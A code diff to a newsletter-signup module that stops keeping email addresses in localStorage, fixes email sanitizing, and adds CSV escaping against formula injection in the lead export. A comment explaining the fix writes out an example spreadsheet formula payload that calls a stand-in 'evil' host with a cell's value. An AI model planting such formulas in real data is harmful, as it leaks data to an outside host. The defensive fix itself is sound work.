@@ -9,11 +9,11 @@
  * Access is tracked in localStorage under `axis_newsletter_access`.
  * Any signup (from any page / source) unlocks all gated lead magnets.
  *
- * Supabase migration: CREATE_NEWSLETTER_LEADS.sql
+ * Supabase migration: supabase/migrations/015_newsletter_leads.sql
  */
 
 import { supabase, supabaseConfigured } from './supabase'
-import { sanitize, sanitizeStrict } from '../utils/sanitize'
+import { sanitize, sanitizeStrict, sanitizeEmail, isValidEmail } from '../utils/sanitize'
 import { DEMO_NEWSLETTER_LEADS } from '../data/demoData'
 
 // ── Types ───────────────────────────────────────────────────────────────────
@@ -48,34 +48,44 @@ function getDemoStore(): NewsletterLead[] {
 }
 
 // ── Access helpers (localStorage) ──────────────────────────────────────────
+//
+// The stored record deliberately omits the EMAIL ADDRESS. Nothing reads it back
+// — the only field any caller touches is `firstName`, for the "welcome back"
+// line — and an address left in localStorage outlives the visit, survives the
+// signup it was collected for, and is readable by anything that ever manages to
+// run script on this origin. The subscription itself lives in the database,
+// which is where the address belongs; this key is a "they signed up" flag.
+
+/** What is actually persisted — a subset of NewsletterAccess, minus the PII. */
+type StoredAccess = Omit<NewsletterAccess, 'email'>
 
 export function getNewsletterAccess(): NewsletterAccess | null {
   try {
     const raw = localStorage.getItem(ACCESS_KEY)
     if (!raw) return null
     const parsed = JSON.parse(raw) as Partial<NewsletterAccess>
-    if (
-      typeof parsed.email === 'string' && parsed.email.length > 0 &&
-      typeof parsed.firstName === 'string'
-    ) {
-      return parsed as NewsletterAccess
+    if (typeof parsed.firstName !== 'string') return null
+    // Older records carry an address from before it stopped being written.
+    // Reading one is the moment to get rid of it rather than the moment to
+    // start trusting it, so it is dropped here and rewritten without it.
+    if (typeof parsed.email === 'string' && parsed.email) {
+      writeAccess(parsed as NewsletterAccess)
     }
-    return null
+    return { ...(parsed as StoredAccess), email: '' }
   } catch { return null }
 }
 
 function writeAccess(access: NewsletterAccess) {
-  localStorage.setItem(ACCESS_KEY, JSON.stringify(access))
+  const stored: StoredAccess = {
+    firstName:  access.firstName,
+    source:     access.source,
+    signedUpAt: access.signedUpAt,
+  }
+  localStorage.setItem(ACCESS_KEY, JSON.stringify(stored))
 }
 
 export function clearNewsletterAccess() {
   localStorage.removeItem(ACCESS_KEY)
-}
-
-// ── Validation ──────────────────────────────────────────────────────────────
-
-function isValidEmail(email: string): boolean {
-  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
 }
 
 // ── Public API ───────────────────────────────────────────────────────────────
@@ -91,7 +101,11 @@ export async function subscribeNewsletter(
 ): Promise<NewsletterLead> {
   const firstName = sanitizeStrict(data.firstName.trim()).slice(0, 100)
   const lastName  = sanitizeStrict(data.lastName.trim()).slice(0, 100)
-  const email     = sanitize(data.email.trim().toLowerCase(), 254)
+  // sanitizeEmail, not sanitize: the general one escapes `&` and `'` into HTML
+  // entities, so an address containing either was stored — and mailed to —
+  // mangled. Both strip tags and cap the length; only one leaves an address
+  // still deliverable.
+  const email     = sanitizeEmail(data.email.trim().toLowerCase())
   const source    = sanitize(data.source.trim(), 100) || 'guides_page'
 
   if (!firstName || !email || !isValidEmail(email)) {
@@ -174,15 +188,32 @@ export async function fetchNewsletterLeads(isDemo: boolean): Promise<NewsletterL
   }))
 }
 
+/**
+ * One CSV cell, escaped for both the file format and the thing that opens it.
+ *
+ * Two separate problems, and the old `"${value}"` handled neither. A value
+ * containing a double quote ends its own field and shifts every column after
+ * it — CSV escapes a quote by doubling it. And a value STARTING with `=`, `+`,
+ * `-` or `@` is a formula to Excel and Sheets, so a subscriber who signs up as
+ * `=HYPERLINK("http://evil/"&A1,"click")` gets that executed on the admin's
+ * machine when they open the export. Prefixing with an apostrophe makes the
+ * spreadsheet treat it as text, which is what a name has always been.
+ */
+function csvCell(value: string): string {
+  const raw = String(value ?? '')
+  const escaped = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw
+  return `"${escaped.replace(/"/g, '""')}"`
+}
+
 /** Generate and download a CSV of newsletter leads. */
 export function exportNewsletterCsv(leads: NewsletterLead[]) {
   const headers = ['First Name', 'Last Name', 'Email', 'Source', 'Signed Up'].join(',')
   const rows = leads.map(l => [
-    `"${l.firstName}"`,
-    `"${l.lastName}"`,
-    `"${l.email}"`,
-    `"${l.source}"`,
-    `"${new Date(l.createdAt).toLocaleDateString('en-US')}"`,
+    csvCell(l.firstName),
+    csvCell(l.lastName),
+    csvCell(l.email),
+    csvCell(l.source),
+    csvCell(new Date(l.createdAt).toLocaleDateString('en-US')),
   ].join(','))
 
   const csv = [headers, ...rows].join('\n')
